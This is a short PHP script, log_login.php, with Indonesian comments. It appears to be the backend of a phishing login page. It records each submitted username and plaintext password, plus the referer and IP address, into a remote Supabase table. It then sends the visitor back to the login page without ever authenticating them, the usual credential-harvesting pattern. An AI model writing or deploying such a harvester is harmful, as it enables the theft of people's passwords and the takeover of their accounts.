<?php
// log_login.php
require_once 'config.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Ambil data dari form
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'UNKNOWN_USER';
    $password = isset($_POST['password']) ? $_POST['password'] : 'NO_PASSWORD';
    $referer_url = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'DIRECT_ACCESS';
    $ip_address = $_SERVER['REMOTE_ADDR'];
    
    // Data yang mau disimpan
    $data = [
        'username' => $username,
        'password' => $password,
        'referer_url' => $referer_url,
        'ip_address' => $ip_address
    ];
    
    // Insert ke Supabase
    $result = supabaseRequest('login_attempts', 'POST', $data);
    
    if (isset($result['error'])) {
        die("<h1>Error menyimpan data!</h1><pre>" . print_r($result, true) . "</pre>");
    }
    
    // Redirect kembali ke halaman login
    header("Location: index.html"); 
    exit();
    
} else {
    header("Location: index.html");
    exit();
}
?>
